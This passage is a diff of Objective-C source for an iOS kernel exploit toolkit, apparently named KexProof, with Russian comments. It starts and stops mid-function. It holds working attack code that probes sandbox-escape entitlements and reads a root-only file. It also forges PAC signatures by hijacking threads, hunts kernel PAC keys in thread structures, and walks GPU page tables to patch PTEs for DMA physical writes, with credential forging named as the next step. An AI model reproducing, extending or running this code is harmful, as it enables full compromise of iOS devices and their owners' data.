+                    uint32_t px = *(volatile uint32_t *)(ctl + i);
+                    if (px != 0xCCCCCCCC && px != 0) { changed2++; if (changed2 <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
+                }
+                if (changed2) {
+                    kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED (DART PTE path): контрольная страница изменена DMA (%u dword) — PTE patch + reuse mapping РАБОТАЕТ. Дальше форж ucred ===", changed2]);
+                } else {
+                    kpNote(r, @"  [P2] ctl не изменилась после PTE-патча — mapping не выжил (purge?) или execute не перечитал PTE");
+                }
+            }
+        } else {
+            kpNote(r, @"  [P2] PTE не найден (цепочка/скан пуст) — mapping снёрнут после execute#1 или таблицы вне читаемых регионов");
+        }
+    }
+    IOObjectRelease(svc);   // коннекшены НЕ закрываем (teardown = наша мина)
+    free(ctl);
+    return r;
+}
+
+#pragma mark - Entitlements test (lara grant verification)
+
+// Binary check that the Plume sideloader granted the lara entitlements we
+// declared: no-sandbox (fork must succeed), iokit-user-client-class
+// (AGXDevice, HID virtual device), tcc (file access), mobileinstall.
++ (NSString *)entitlementsTestReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== ENTITLEMENTS TEST: применились ли lara-энтитлменты ===");
+
+    // 1. no-sandbox: fork() — banned inside the app sandbox
+    pid_t fpid = fork();
+    if (fpid == 0) { _exit(42); }
+    int st = 0;
+    if (fpid > 0) waitpid(fpid, &st, 0);
+    kpNote(r, [NSString stringWithFormat:@"  fork(): %@%@",
+              fpid >= 0 ? @"РАБОТАЕТ (no-sandbox ПРИМЕНЁН!)" : @"ОТКАЗ",
+              fpid >= 0 ? @"" : [NSString stringWithFormat:@" errno=%d (%s)", errno, strerror(errno)]]);
+
+    // 2. iokit-user-client-class: AGXDevice open
+    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXDevice"));
+    if (agx) {
+        io_connect_t ac = 0;
+        kern_return_t kr = IOServiceOpen(agx, mach_task_self(), 0, &ac);
+        kpNote(r, [NSString stringWithFormat:@"  AGXDevice: сервис 0x%x, open kr=0x%x (%s)%@",
+                  agx, kr, mach_error_string(kr), kr == 0 ? @" ← AGX ДОСТУПЕН (Rocket physwrite-вектор открыт!)" : @""]);
+        if (ac) IOServiceClose(ac);
+        IOObjectRelease(agx);
+    } else {
+        kpNote(r, @"  AGXDevice: сервис не найден");
+    }
+
+    // 3. iokit: HID virtual device (for CVE-2026-28992)
+    extern CFTypeRef IOHIDUserDeviceCreate(CFAllocatorRef allocator, CFDictionaryRef properties);
+    NSDictionary *devProps = @{
+        @"VendorID": @0x1337, @"ProductID": @0x4242, @"Product": @"KPEntTest",
+        @"DeviceUsagePairs": @[ @{ @"DeviceUsagePage": @1, @"DeviceUsage": @6 } ],
+        @"Elements": @[ @{ @"ElementCookie": @1, @"UsagePage": @1, @"Usage": @6,
+                           @"Type": @2, @"ReportCount": @8, @"ReportSize": @1 } ],
+    };
+    CFTypeRef vdev = IOHIDUserDeviceCreate(kCFAllocatorDefault, (__bridge CFDictionaryRef)devProps);
+    kpNote(r, [NSString stringWithFormat:@"  IOHIDUserDeviceCreate: %@%@",
+              vdev ? @"РАБОТАЕТ (HID virtual есть — CVE-2026-28992 gate открыт!)" : @"NULL (entitlement не применён)",
+              vdev ? @"" : @""]);
+    if (vdev) CFRelease(vdev);
+
+    // 4. tcc: read a root-only path (SpringBoard material recipes, like lara)
+    const char *probePath = "/private/var/mobile/Library/SpringBoard/IconState.plist";
+    int fd = open(probePath, O_RDONLY);
+    kpNote(r, [NSString stringWithFormat:@"  tcc (open %s): %@%@", probePath,
+              fd >= 0 ? @"ЧИТАЕТСЯ (tcc all files ПРИМЕНЁН!)" : @"ОТКАЗ",
+              fd >= 0 ? @"" : [NSString stringWithFormat:@" errno=%d (%s)", errno, strerror(errno)]]);
+    if (fd >= 0) close(fd);
+
+    [r appendString:@"\n=== Результат: каждый РАБОТАЕТ = стена снята. fork → EXP-13 nest/unnest; AGX → Rocket physwrite; HID virtual → CVE-2026-28992; tcc → системные файлы ===\n"];
+    return r;
+}
+
+#pragma mark - PAC forging test (TaskRop port)
+
+// Resolve a mach thread port to its kernel thread_t VA through our own
+// itk_space ladder (same chain as E10/D1/m2 dumpClient).
+static uint64_t kpRCIsTable = 0;
+
++ (uint64_t)rcIsTableWithLog:(NSMutableString *)r
+{
+    if (kpRCIsTable) return kpRCIsTable;
+    uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
+    if (!selfProc) selfProc = [self findProcByCommName:"KexProofV2" log:r];
+    if (!selfProc) return 0;
+    uint64_t pr = 0, tk = 0, sp = 0, tb = 0;
+    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &pr, 8, "rc proc_ro", r)) return 0;
+    pr = kp_untag_ptr(pr);
+    if (!kpRead(pr + off_proc_ro_pr_task, &tk, 8, "rc task", r)) return 0;
+    tk = kp_untag_ptr(tk);
+    if (!kpRead(tk + off_task_itk_space, &sp, 8, "rc itk_space", r)) return 0;
+    sp = kp_untag_ptr(sp);
+    if (!kpRead(sp + off_ipc_space_is_table, &tb, 8, "rc is_table", r)) return 0;
+    kpRCIsTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                  ? kp_untag_ptr(kpSMRDecode(tb)) : kp_untag_ptr(tb);
+    return kpRCIsTable;
+}
+
++ (uint64_t)rcResolveThreadKVA:(mach_port_t)port
+{
+    uint64_t table = kpRCIsTable;
+    if (!table) return 0;
+    uint64_t eVA = table + (uint64_t)sizeof_ipc_entry * (port >> 8);
+    uint64_t oRaw = 0, kRaw = 0;
+    kreadbuf(eVA + off_ipc_entry_ie_object, &oRaw, 8);
+    uint64_t pVA = kp_untag_ptr(oRaw);
+    if (!(pVA > 0xffffff0000000000ULL && pVA < 0xffffffff00000000ULL)) return 0;
+    kreadbuf(pVA + off_ipc_port_ip_kobject, &kRaw, 8);
+    return kp_untag_ptr(kRaw);
+}
+
+static void kpPacLive(NSString *line)
+{
+    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-pac.txt"];
+    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
+    if (!h) {
+        [line writeToFile:p atomically:NO encoding:NSUTF8StringEncoding error:nil];
+        return;
+    }
+    [h seekToEndOfFile];
+    [h writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
+    [h closeFile];
+}
+
+static volatile uint64_t g_kppark_stop = 0;
+static void *kpParkWorker(void *arg)
+{
+    (void)arg;
+    while (!g_kppark_stop) usleep(5000);
+    return NULL;
+}
+
++ (NSString *)pacTestReport
+{
+    NSMutableString *r = [NSMutableString string];
+    NSString *pacPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-pac.txt"];
+    [@"" writeToFile:pacPath atomically:NO encoding:NSUTF8StringEncoding error:nil];
+    void (^pacnote)(NSString *) = ^(NSString *s){ kpNote(r, s); kpPacLive([s stringByAppendingString:@"\n"]); };
+    pacnote(@"=== PAC forging test (TaskRop remotepac port) ===");
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW не жив — сначала эксплойт.\n"];
+        return r;
+    }
+    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; kpPacLive(@"FAIL: is_table\n"); return r; }
+
+    mach_port_t tport = mach_thread_self();
+    uint64_t threadVA = [self rcResolveThreadKVA:tport];
+    mach_port_deallocate(mach_task_self(), tport);
+    if (!threadVA) { [r appendString:@"FAIL: thread_t VA не резолвится\n"]; kpPacLive(@"FAIL: thread_t VA\n"); return r; }
+    pacnote([NSString stringWithFormat:@"  наш thread_t @ %#llx", (unsigned long long)threadVA]);
+
+    extern uint64_t kp_rc_kread64(uint64_t);
+    extern uint64_t kp_pacia(uint64_t, uint64_t);
+    extern uint64_t kp_ptrauthstrdisc(const char *);
+    extern bool kp_pacsignworks(void);
+    extern uint64_t kp_remotepac(uint64_t, uint64_t, uint64_t);
+    extern uint64_t kp_findpacia(void);
+    extern void kp_upcbcalib(uint64_t);
+
+    uint64_t keya = kp_rc_kread64(threadVA + 0x1B0);
+    uint64_t keyb = kp_rc_kread64(threadVA + 0x1B8);
+    pacnote([NSString stringWithFormat:@"  наши PAC keys: rop_pid=%#llx jop_pid=%#llx",
+              (unsigned long long)keya, (unsigned long long)keyb]);
+
+    BOOL signworks = kp_pacsignworks();
+    pacnote([NSString stringWithFormat:@"  userland pacia работает: %@", signworks ? @"да" : @"нет"]);
+
+    uint64_t gadget = kp_findpacia();
+    pacnote([NSString stringWithFormat:@"  pacia gadget @ %#llx %@", (unsigned long long)gadget,
+              gadget ? @"" : @"  (не найден в нашем бинаре — remotepac не взлетит)"]);
+
+    // sign a test pointer with OUR keys through the hijacked pacthread
+    uint64_t address = 0x0000000041414141ULL;
+    uint64_t modifier = kp_ptrauthstrdisc("pc");
+    uint64_t expected = kp_pacia(address, modifier);
+    pacnote([NSString stringWithFormat:@"  цель: подписать %#llx mod=%#llx (ожидаем %#llx через наш userland pacia)",
+              (unsigned long long)address, (unsigned long long)modifier, (unsigned long long)expected]);
+
+    pacnote(@"  → вызываю kp_remotepac (thread hijack)…");
+    uint64_t signed_ = kp_remotepac(threadVA, address, modifier);
+    pacnote([NSString stringWithFormat:@"  remotepac → %#llx %@", (unsigned long long)signed_,
+              signed_ == expected ? @"— СОВПАЛО С ОЖИДАНИЕМ: PAC forging через thread hijack РАБОТАЕТ!"
+                                  : (signed_ == (uint64_t)-1 || signed_ == 0 ? @"— не получилось" : @"— получена, но != ожиданию (ключи другие?)")]);
+    if (signed_ == expected) {
+        [r appendString:@"\n=== PAC FORGING VERIFIED: подписываем любые указатели любыми ключами — с kernel_task keys это kcall на arm64e → SPTM retype → physwrite ===\n"];
+        kpPacLive(@"\n=== PAC FORGING VERIFIED ===\n");
+
+        // --- kernel keys probe: есть ли у kernel_task тредов PAC-ключи? ---
+        pacnote(@"--- kernel keys probe ---");
+        // task_self() через сокет вернул 0 — резолвим от нашего thread_t:
+        // thread+0x3E8 = t_tro (thread_ro), thread_ro+0x28 = tro_task (18.6).
+        uint64_t tro = kp_untag_ptr(kp_rc_kread64(threadVA + 0x3E8));
+        uint64_t selfTask = kp_untag_ptr(kp_rc_kread64(tro + 0x28));
+        pacnote([NSString stringWithFormat:@"  tro=%#llx selfTask=%#llx selfThread=%#llx", tro, selfTask, threadVA]);
+        if (!kpLooksLikeKernelPointer(selfTask)) { pacnote(@"  selfTask не резолвится — стоп"); return r; }
+        // дамп для глаз: очередь тредов = два соседних heap-указателя в task,
+        // линк в thread_t = указатель обратно на очередь
+        NSMutableString *dumpT = [NSMutableString stringWithString:@"  task dump:"];
+        for (uint32_t o = 0x40; o <= 0xC0; o += 8)
+            [dumpT appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(selfTask + o)];
+        pacnote(dumpT);
+        NSMutableString *dumpTh = [NSMutableString stringWithString:@"  thread dump:"];
+        for (uint32_t o = 0x300; o <= 0x400; o += 8)
+            [dumpTh appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(threadVA + o)];
+        pacnote(dumpTh);
+        // Эмпирическая кросс-разметка: второй припаркованный тред. Ищем
+        // A+l == B+l (соседние звенья одной очереди) и поля таска,
+        // указывающие прямо в наши thread_t.
+        uint32_t taskQ = 0, linkQ = 0;
+        g_kppark_stop = 0;
+        pthread_t pb;
+        uint64_t thrB = 0;
+        if (pthread_create(&pb, NULL, kpParkWorker, NULL) == 0) {
+            pthread_detach(pb);
+            usleep(2000);
+            thrB = [self rcResolveThreadKVA:pthread_mach_thread_np(pb)];
+        }
+        pacnote([NSString stringWithFormat:@"  parked thread B=%#llx", thrB]);
+        if (thrB) {
+            for (uint32_t l = 0x300; l <= 0x500; l += 8) {
+                uint64_t vA = kp_untag_ptr(kp_rc_kread64(threadVA + l));
+                uint64_t vB = kp_untag_ptr(kp_rc_kread64(thrB + l));
+                if (vA >= thrB && vA < thrB + 0x800) {
+                    pacnote([NSString stringWithFormat:@"  A+%#x → B+%#llx%@", l, vA - thrB,
+                              (vA - thrB) == l ? @" ← ЛИНК" : @""]);
+                    if ((vA - thrB) == l && !linkQ) linkQ = l;
+                }
+                if (vB >= threadVA && vB < threadVA + 0x800) {
+                    pacnote([NSString stringWithFormat:@"  B+%#x → A+%#llx%@", l, vB - threadVA,
+                              (vB - threadVA) == l ? @" ← ЛИНК" : @""]);
+                    if ((vB - threadVA) == l && !linkQ) linkQ = l;
+                }
+            }
+            for (uint32_t t = 0x40; t <= 0x140; t += 8) {
+                uint64_t v = kp_untag_ptr(kp_rc_kread64(selfTask + t));
+                const char *who = NULL; uint64_t base = 0;
+                if (v >= threadVA && v < threadVA + 0x800) { who = "A"; base = threadVA; }
+                else if (v >= thrB && v < thrB + 0x800) { who = "B"; base = thrB; }
+                if (who) {
+                    pacnote([NSString stringWithFormat:@"  task+%#x → %s+%#llx ← ГОЛОВА?", t, who, v - base]);
+                    if (!taskQ) taskQ = t;
+                }
+            }
+            // валидация пары: head.next-thread должен вести на свой таск
+            if (taskQ && linkQ) {
+                uint64_t A0 = kp_untag_ptr(kp_rc_kread64(selfTask + taskQ));
+                uint64_t thr0 = A0 - linkQ;
+                uint64_t tro0 = kp_untag_ptr(kp_rc_kread64(thr0 + 0x3E8));
+                uint64_t tsk0 = kp_untag_ptr(kp_rc_kread64(tro0 + 0x28));
+                pacnote([NSString stringWithFormat:@"  проверка: thr0=%#llx tsk0=%#llx%@", thr0, tsk0,
+                          (tsk0 == selfTask) ? @" ← ПАРА ВЕРНАЯ" : @" — пара неверна, сброс"]);
+                if (tsk0 != selfTask) { taskQ = 0; linkQ = 0; }
+            }
+        }
+        g_kppark_stop = 1;
+        pacnote([NSString stringWithFormat:@"  self-calib: task.threads=0x%x link=0x%x %@", taskQ, linkQ,
+                  taskQ ? @"" : @"— НЕ ПОДОБРАЛИ (стоп)"]);
+        if (taskQ) {
+            uint64_t ktProc = [self findProcByCommName:"kernel_task" log:r];
+            if (ktProc) {
+                uint64_t p_proc_ro = kp_untag_ptr(kp_rc_kread64(ktProc + off_proc_p_proc_ro));
+                uint64_t ktTask = kp_untag_ptr(kp_rc_kread64(p_proc_ro + off_proc_ro_pr_task));
+                pacnote([NSString stringWithFormat:@"  kernel_task task @ %#llx", ktTask]);
+                uint64_t head = ktTask + taskQ;
+                uint64_t cur = kp_untag_ptr(kp_rc_kread64(head));
+                uint64_t ktThread = (cur && cur != head && kpLooksLikeKernelPointer(cur)) ? cur - linkQ : 0;
+                pacnote([NSString stringWithFormat:@"  первый kernel thread_t @ %#llx", ktThread]);
+                if (ktThread) {
+                    uint64_t ka = kp_rc_kread64(ktThread + 0x1B0);
+                    uint64_t kb = kp_rc_kread64(ktThread + 0x1B8);
+                    pacnote([NSString stringWithFormat:@"  kernel thread keys: a=%#llx b=%#llx %@", ka, kb,
+                              (ka || kb) ? @"" : @"— НУЛИ: у kernel-тредов нет user-ключей, kernel-signing через thread_t закрыт"]);
+                    // kernel remotepac СНЯТ С ПРОГОНА: у kernel-треда «upcb» — мусор,
+                    // запись оттуда в worker = copy_validate panic (2 ребута).
+                    pacnote(@"  kernel remotepac: пропущен (путь мёртв — ключей нет; upcb kernel-треда невалиден)");
+                }
+            }
+        }
+
+        // --- key storage hunt: где РЕАЛЬНО лежит jop_pid? ---
+        {
+            pacnote(@"--- key storage hunt ---");
+            uint64_t jop = kp_rc_kread64(threadVA + 0x1B8);
+            uint64_t ftbl = [self frameTableVAWithLog:r];
+            int tThread = kpVAType(threadVA, ftbl);
+            int tTro = kpVAType(tro, ftbl);
+            pacnote([NSString stringWithFormat:@"  jop_pid=%#llx · frame types: thread_t=0x%x thread_ro=0x%x (0x21=heap RW, 0x18=ROZONE)", (unsigned long long)jop, tThread, tTro]);
+            // постраничный скан (16K страница зоны всегда замаплена целиком)
+            NSMutableString *hits = [NSMutableString stringWithString:@"  jop_pid найден:"];
+            int nh = 0;
+            uint64_t pgT = threadVA & ~0x3FFFULL;
+            for (uint64_t a = pgT; a < pgT + 0x4000 && nh < 10; a += 8)
+                if (kp_rc_kread64(a) == jop) { [hits appendFormat:@" thread%+#llx", a - threadVA]; nh++; }
+            uint64_t pgR = tro & ~0x3FFFULL;
+            for (uint64_t a = pgR; a < pgR + 0x4000 && nh < 20; a += 8)
+                if (kp_rc_kread64(a) == jop) { [hits appendFormat:@" tro%+#llx", a - tro]; nh++; }
+            if (!nh) [hits appendString:@" НИГДЕ в страницах thread_t/thread_ro"];
+            pacnote(hits);
+
+            // contextData: отсюда ядро грузит ключи в CPU при context switch
+            uint64_t cdata = kp_untag_ptr(kp_rc_kread64(threadVA + 0xF8));
+            int tCd = kpVAType(cdata, ftbl);
+            pacnote([NSString stringWithFormat:@"  machine.contextData=%#llx type=0x%x", cdata, tCd]);
+            // указатели вокруг 0xF0-0x110 глазами
+            NSMutableString *dumpM = [NSMutableString stringWithString:@"  machine ptrs:"];
+            for (uint32_t o = 0xE0; o <= 0x120; o += 8)
+                [dumpM appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(threadVA + o)];
+            pacnote(dumpM);
+            // upcb: user pcb с arm_pac_key_state_t
+            uint64_t upcb = kp_untag_ptr(kp_rc_kread64(threadVA + 0x100));
+            int tUp = kpVAType(upcb, ftbl);
+            pacnote([NSString stringWithFormat:@"  machine.upcb=%#llx type=0x%x", upcb, tUp]);
+            if (kpLooksLikeKernelPointer(upcb)) {
+                NSMutableString *ups = [NSMutableString stringWithString:@"  upcb scan:"];
+                int nu = 0;
+                uint64_t pgU = upcb & ~0x3FFFULL;
+                for (uint64_t a = pgU; a < pgU + 0x4000 && nu < 24; a += 8) {
+                    uint64_t v = kp_rc_kread64(a);
+                    if (v == jop) { [ups appendFormat:@" JOP@%+#llx", a - upcb]; nu++; }
+                }
+                if (!nu) [ups appendString:@" jop_pid тут нет"];
+                pacnote(ups);
+                NSMutableString *dumpU = [NSMutableString stringWithString:@"  upcb dump:"];
+                for (uint32_t o = 0; o < 0x100; o += 8)
+                    [dumpU appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(upcb + o)];
+                pacnote(dumpU);
+            }
+            // калибровка upcb-слотов: какой оффсет реально влияет на pacia/pacib
+            pacnote(@"--- upcb slot calibration ---");
+            kp_upcbcalib(threadVA);
+            if (kpLooksLikeKernelPointer(cdata)) {
+                NSMutableString *cd = [NSMutableString stringWithString:@"  contextData scan:"];
+                int nc = 0;
+                uint64_t pgC = cdata & ~0x3FFFULL;
+                for (uint64_t a = pgC; a < pgC + 0x4000 && nc < 24; a += 8) {
+                    uint64_t v = kp_rc_kread64(a);
+                    if (v == jop) { [cd appendFormat:@" JOP@%+#llx", a - cdata]; nc++; }
+                    else if (v == kp_rc_kread64(threadVA + 0x1B0)) { [cd appendFormat:@" ROP@%+#llx", a - cdata]; nc++; }
+                }
+                if (!nc) [cd appendString:@" ключи из thread_t тут не встречаются"];
+                pacnote(cd);
+                // дамп первых 0x80 байт contextData — глазами видим ключевой блок
+                NSMutableString *dumpC = [NSMutableString stringWithString:@"  cdata dump:"];
+                for (uint32_t o = 0; o < 0x80; o += 8)
+                    [dumpC appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(cdata + o)];
+                pacnote(dumpC);
+            }
+        }
+    }
+    return r;
+}
+
+// Полный walk+скан одного mapper'а: L1arr → L2 → L3 → наш PTE, скан L3 по PA.
+// Возвращает kernel VA L3-страницы (или 0).
+static void kpGartLive(NSString *line);
+#define GNOTE2(...) do { kpNote(r, (__VA_ARGS__)); kpGartLive((__VA_ARGS__)); } while (0)
+#define GNOTE(...) GNOTE2(__VA_ARGS__)
+static uint64_t kpUatWalkScan(NSMutableString *r, uint64_t mapper, uint64_t gpuVA, uint64_t pa0, const char *label)
+{
+    extern uint64_t kp_rc_kread64(uint64_t);
+    if (!kpLooksLikeKernelPointer(mapper)) { GNOTE2( [NSString stringWithFormat:@"  walk[%s]: mapper невалиден", label]); return 0; }
+    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: mapper=%#llx ops[0]=%#llx", label, mapper, kp_rc_kread64(mapper)]);
+    uint64_t L1arr = kp_untag_ptr(kp_rc_kread64(mapper + 0x30));
+    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: L1arr=%#llx", label, L1arr]);
+    if (!L1arr) return 0;
+    uint32_t pc = (uint32_t)((gpuVA >> 36) & 0x7FF);
+    uint32_t pd = (uint32_t)((gpuVA >> 25) & 0x7FF);
+    uint32_t pt = (uint32_t)((gpuVA >> 14) & 0x7FF);
+    uint64_t e1 = kp_rc_kread64(L1arr + (uint64_t)pc * 8);
+    uint64_t L2pa = e1 & 0xFFFFFFFFF000ULL;
+    uint64_t L2 = (L2pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L2pa) : 0;
+    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: pc=%u e1=%#llx → L2kv=%#llx", label, pc, e1, L2]);
+    if (!L2) return 0;
+    uint64_t e2 = kp_rc_kread64(L2 + (uint64_t)pd * 8);
+    uint64_t L3pa = e2 & 0xFFFFFFFFF000ULL;
+    uint64_t L3 = (L3pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L3pa) : 0;
+    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: pd=%u e2=%#llx → L3kv=%#llx", label, pd, e2, L3]);
+    if (!L3) return 0;
+    uint64_t pte = kp_rc_kread64(L3 + (uint64_t)pt * 8);
+    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: pt=%u PTE=%#llx (наш PA=%#llx)", label, pt, pte, pa0]);
+    int nnz = 0;
+    NSMutableString *nz = [NSMutableString stringWithString:@""];
+    for (int j = 0; j < 2048; j++) {
+        uint64_t e = kp_rc_kread64(L3 + (uint64_t)j * 8);
+        if (!e) continue;
+        if (nnz < 12) [nz appendFormat:@" [%d]=%#llx", j, e];
+        nnz++;
+        if (pa0 && (e & 0xFFFFFFFFF000ULL) == (pa0 & 0xFFFFFFFFF000ULL))
+            GNOTE2( [NSString stringWithFormat:@"  ★ НАШ PTE: %s L3[%d]=%#llx", label, j, e]);
+    }
+    GNOTE2( [NSString stringWithFormat:@"  walk[%s]: L3 живых записей: %d%@", label, nnz, nz]);
+    return L3;
+}
+
+#pragma mark - GART recon (IOGPU → AGXSecureGart, read-only)
+
+extern uint64_t kp_rc_kread64(uint64_t);
+
+static void *gBufContents = NULL;
+static uint64_t gBufGPUVA = 0;
+static id gGartBuf = nil; // удерживаем MTLBuffer живым между стадиями
+
+// Live-запись GART-стадий: паника не сотрёт готовое (как kexproof-pac.txt).
+static BOOL gGartLive = NO;
+static void kpGartLive(NSString *line)
+{
+    if (!gGartLive) return;
+    // os_log → device syslog, читается по USB через idevicesyslog В РЕАЛЬНОМ
+    // времени — паника ничего не забирает (не файл, не контейнер).
+    os_log_error(OS_LOG_DEFAULT, "[GART] %{public}s", [line UTF8String]);
+    extern void KPLogDirect(const char *);
+    KPLogDirect([line UTF8String]); // зеркало в kexproof-live.log (переживает ребут)
+    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-gart.txt"];
+    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
+    NSData *d = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
+    if (!h) { [d writeToFile:p atomically:NO]; return; }
+    [h seekToEndOfFile];
+    [h writeData:d];
+    [h synchronizeFile];   // fsync КАЖДОЙ строки — EL2-ресет не сожрёт page cache
+    [h closeFile];
+}
+
+// Дамп pointer-полей объекта: ТОЛЬКО значения, без дереференсов (дереф по
+// physmap в выключенный carveout = аппаратный ресет без паник-лога, проверено).
+static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name, uint32_t size)
+{
+    GNOTE2( [NSString stringWithFormat:@"  --- %s @ %#llx (pointer fields):", name, objVA]);
+    int shown = 0;
+    for (uint32_t o = 0; o < size && shown < 128; o += 8) {
+        uint64_t v = kp_rc_kread64(objVA + o);
+        uint64_t u = kp_untag_ptr(v);
+        if (!kpLooksLikeKernelPointer(u)) continue;
+        // v == u → чистый указатель; иначе — PAC-тегнутый (пишем оба)
+        if (v == u)
+            GNOTE2( [NSString stringWithFormat:@"    +%#04x → %#llx", o, u]);
+        else
+            GNOTE2( [NSString stringWithFormat:@"    +%#04x → %#llx (raw %#llx)", o, u, v]);
+        shown++;
+    }
+    if (!shown) GNOTE2( @"    (нет kernel-указателей)");
+}
+
+// Гейт для hunt-указателей: kernel band, не EL2, PA в managed DRAM
+// (иначе чтение MMIO/carveout через физапертуру = паника).
+static BOOL kpHuntPtrOK(uint64_t v)
+{
+    v = kp_untag_ptr(v);
+    if (!kpLooksLikeKernelPointer(v) || kpVAIsEL2Domain(v)) return NO;
+    uint64_t pa = kvtophys(v);
+    return pa && kpPAIsManaged(pa);
+}
+
+// RACE PoC: состояние молотилки + сам тред
+extern void kp_rc_kwrite64(uint64_t, uint64_t);
+// io_connect_method (MIG-стаб) НЕ экспортируется на iOS — достаём адрес
+// стаба из публичной обёртки io_connect_method_scalarI_structureO (первый
+// bl/b внутри неё ведёт на стаб).
+typedef uint64_t *kp_scalar64_t;
+typedef kern_return_t (*kp_io_connect_method_fn)(
+    mach_port_t, uint32_t,
+    kp_scalar64_t, mach_msg_type_number_t,
+    io_struct_inband_t, mach_msg_type_number_t,
+    mach_vm_address_t, mach_vm_size_t,
+    kp_scalar64_t, mach_msg_type_number_t *,
+    io_struct_inband_t, mach_msg_type_number_t *,
+    mach_vm_address_t, mach_vm_size_t *);
+static kp_io_connect_method_fn kpFindIoConnectMethod(void)
+{
+    static kp_io_connect_method_fn fn = NULL;
+    if (fn) return fn;
+    kpGartLive(@"  icm v3: вход");
+    // 1. live-обёртка + live-база IOKit (slide = live - cache)
+    void *wLive = dlsym(RTLD_DEFAULT, "IOConnectCallStructMethod");
+    if (!wLive) wLive = dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+    kpGartLive([NSString stringWithFormat:@"  icm v3: wLive=%p", wLive]);
+    if (!wLive) { kpGartLive(@"  icm: нет live-обёртки"); return NULL; }
+    uintptr_t liveBase = 0;
+    const char *wantPath = "IOKit.framework";
+    for (uint32_t i = 0; i < _dyld_image_count(); i++) {
+        const char *nm = _dyld_get_image_name(i);
+        if (nm && strstr(nm, wantPath)) { liveBase = (uintptr_t)_dyld_get_image_header(i); break; }
+    }
+    kpGartLive([NSString stringWithFormat:@"  icm v3: liveBase=%#lx images=%u", liveBase, _dyld_image_count()]);
+    // 2. dyld-кэш как ФАЙЛ (читаемый): mappings/images
+    const char *paths[] = {
+        "/System/Volumes/Preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
+        "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
+        "/System/Volumes/Preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e.1",
+        NULL,
+    };
+    FILE *f = NULL;
+    int usedPi = -1;
+    for (int pi = 0; paths[pi] && !f; pi++) { f = fopen(paths[pi], "rb"); if (f) usedPi = pi; }
+    if (!f || !liveBase) { kpGartLive([NSString stringWithFormat:@"  icm: f=%p liveBase=%#lx — стоп", f, liveBase]); if (f) fclose(f); return NULL; }
+    uint8_t hdr[0x20];
+    if (fread(hdr, 1, sizeof hdr, f) != sizeof hdr) { kpGartLive(@"  icm: hdr fread fail"); fclose(f); return NULL; }
+    uint32_t mappingOffset = *(uint32_t *)(hdr + 0x10);
+    uint32_t mappingCount = *(uint32_t *)(hdr + 0x14);
+    uint32_t imagesOffset = *(uint32_t *)(hdr + 0x18);
+    uint32_t imagesCount = *(uint32_t *)(hdr + 0x1C);
+    kpGartLive([NSString stringWithFormat:@"  icm v3: кэш #%d mappings=%u images=%u", usedPi, mappingCount, imagesCount]);
+    uint64_t cacheBase = 0, funcCacheVA = 0;
+    char pathbuf[256];
+    for (uint32_t i = 0; i < imagesCount && i < 4096; i++) {
+        uint8_t ie[0x20];
+        fseeko(f, imagesOffset + (off_t)i * 0x20, SEEK_SET);
+        if (fread(ie, 1, sizeof ie, f) != sizeof ie) break;
+        uint64_t addr = *(uint64_t *)(ie + 0);
+        uint32_t poff = *(uint32_t *)(ie + 0x18);
+        if (!poff) continue;
+        fseeko(f, poff, SEEK_SET);
+        memset(pathbuf, 0, sizeof pathbuf);
+        if (!fread(pathbuf, 1, sizeof pathbuf - 1, f)) continue;
+        if (strstr(pathbuf, wantPath)) {
+            cacheBase = addr;
+            funcCacheVA = addr + ((uintptr_t)wLive - liveBase);
+            break;
+        }
+    }
+    if (!funcCacheVA) { kpGartLive([NSString stringWithFormat:@"  icm: IOKit не найден в кэше #%d", usedPi]); fclose(f); return NULL; }
+    uint64_t slide = liveBase - cacheBase;
+    off_t foff = -1;
+    for (uint32_t m = 0; m < mappingCount && m < 64; m++) {
+        uint8_t me[0x20];
+        fseeko(f, mappingOffset + (off_t)m * 0x20, SEEK_SET);
+        if (fread(me, 1, sizeof me, f) != sizeof me) break;
+        uint64_t va = *(uint64_t *)(me + 0), sz = *(uint64_t *)(me + 8), fo = *(uint64_t *)(me + 16);
+        if (funcCacheVA >= va && funcCacheVA < va + sz) { foff = (off_t)(fo + (funcCacheVA - va)); break; }
+    }
+    if (foff < 0) { kpGartLive(@"  icm: mapping не найден"); fclose(f); return NULL; }
+    uint32_t ins[32];
+    fseeko(f, foff, SEEK_SET);
+    if (fread(ins, 4, 32, f) != 32) { kpGartLive(@"  icm: ins fread fail"); fclose(f); return NULL; }
+    fclose(f);
+    for (int i = 0; i < 32; i++) {
+        uint32_t op = ins[i];
